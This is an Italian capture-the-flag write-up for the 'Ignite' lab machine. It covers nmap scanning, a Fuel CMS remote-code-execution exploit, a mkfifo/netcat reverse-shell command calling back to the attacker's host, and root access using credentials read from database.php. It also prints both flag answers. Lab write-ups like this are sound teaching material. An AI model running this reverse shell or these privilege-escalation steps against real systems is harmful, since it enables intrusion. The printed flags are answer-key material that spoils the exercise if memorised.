# Ignite

____________

# Task 1 - Root it!

-  nmap -p- --open -sC -sV -sS -A -T 5 -Pn -oN scan_ignite.txt TARGET-IP

![Istantanea_2023-08-04_09-39-23](https://github.com/Manganaccio/Manganaccio/assets/137283468/3dfcba0c-7325-48c2-9bb6-936e798b53f2)

-  la scansione con nmap mostra che la porta 80 è aperta, pertanto possiamo navigare al sito web http://TARGET-IP

![Istantanea_2023-08-04_09-42-03](https://github.com/Manganaccio/Manganaccio/assets/137283468/39b93c47-ac65-42ea-9024-c7cb16d6b197)

-  il sito web mostra informazione molto interessanti relativamente al CMS e alla versione installata; scorrendo poi nel sito web si possono ottenere ulteriori informazioni inerenti le credenziali di default per l'accesso e la directory di login

![Istantanea_2023-08-04_09-41-01](https://github.com/Manganaccio/Manganaccio/assets/137283468/460823f9-641a-4bc8-b1bd-5ee575ee90c2)

-  attraverso una ricerca sulle eventuali vulnerabilità relative al CMS in questione (si può usare il comando _serachsploit fuel cms_ direttamente nel terminale o attraverso database come [exploit-db](https://www.exploit-db.com/)), si può notare che Fuel CMS è vulnerabile a RCE (Remote Code Execution)

![Istantanea_2023-08-04_15-01-45](https://github.com/Manganaccio/Manganaccio/assets/137283468/7ee282c6-a5d5-4d8e-a1af-e16508ed55e1)

-   con riferimento al file evidenziato nell'immagine sopra, una volta eseguito si può ottenere il controllo della shell attraverso l'esecuzione del comando "nc mkfifo": rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR-IP PORT >/tmp/f

![Istantanea_2023-08-04_10-05-20](https://github.com/Manganaccio/Manganaccio/assets/137283468/596c0041-7019-4f39-9a62-e9d8de2c68e3)

-   in un terminale eseguire il comando: nc -lvnp PORT (la porta da selezionare dovrà essere la medesima inserita nel comando "nc mkfifo")

![Istantanea_2023-08-04_10-05-46](https://github.com/Manganaccio/Manganaccio/assets/137283468/ba3e8548-abb6-4240-aac5-5af2a7c5ad07)

# User.txt

-  la prima flag si trova facilmente nella cartella /home/www-data

        Answer: 6470e394cbf6dab6a91682cc8585059b

# Root.txt

-  per trovare la seconda flag sarà necessario fare una piccola scalata dei privilegi; ritornando nella pagina web si ha un'ulteriore informazione che si può sfruttare per ottenere l'accesso al profilo root, sarà necessario quindi leggere il file database.php

![Istantanea_2023-08-04_15-24-43](https://github.com/Manganaccio/Manganaccio/assets/137283468/bc99f199-2f2b-43d8-914b-0be848b4b228)

- i dati presenti (username e password) ci permetteranno di accedere al profilo root e leggere la flag root.txt

![Istantanea_2023-08-04_10-21-38](https://github.com/Manganaccio/Manganaccio/assets/137283468/5064c3f6-b2f2-4268-b0b0-87795cd40025)

![Istantanea_2023-08-04_10-22-43](https://github.com/Manganaccio/Manganaccio/assets/137283468/5ff789e4-cacc-4c55-9064-1d71d1ee88ba)

        Answer: b9bbcb33e11b80be759c4e844862482d
